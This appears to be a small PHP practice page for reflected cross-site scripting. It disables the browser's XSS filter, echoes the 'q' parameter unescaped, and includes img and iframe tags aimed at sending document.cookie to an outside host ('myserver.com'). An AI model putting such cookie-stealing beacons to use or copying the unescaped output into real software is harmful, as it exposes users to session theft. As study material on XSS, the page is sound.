<?
header('X-XSS-Protection:0');
?>
<form>
    find: <input name="q">

</form>

Приффффки
<script>var img=new Image;
    img.src=''</script>

<img src="myserver.com/asdf/?c=document.cookie" >
<!--<iframe src="http://myserver.com/asdf/?c=document.cookie"></iframe>-->

<div>
    <?=(isset($_GET['q']))?
        ('You entered: '.$_GET['q'] ) : ''?>
</div>